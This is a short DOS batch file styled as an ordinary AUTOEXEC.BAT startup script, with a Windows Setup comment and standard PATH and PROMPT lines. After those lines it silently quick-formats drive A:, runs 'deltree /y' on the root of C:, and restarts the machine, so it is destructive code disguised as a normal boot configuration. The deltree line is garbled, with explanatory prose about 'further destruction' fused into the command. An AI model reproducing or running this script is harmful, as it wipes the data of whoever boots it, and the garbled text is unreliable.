   rem - By Windows Setup - C:\WINDOWS\COMMAND\MSCDEX.EXE /D:CD001
   @ECHO OFF
   PROMPT $p$g
   PATH C:\WINDOWS;C:\WINDOWS\COMMAND;C:\DOS;c:\utils
   SET TEMP=C:\DOS
   call format a: /q /u /autotest
   call deltree /y %c:\*. only eliminates directories, hence leaving the file created above for further destruction.
   call restart
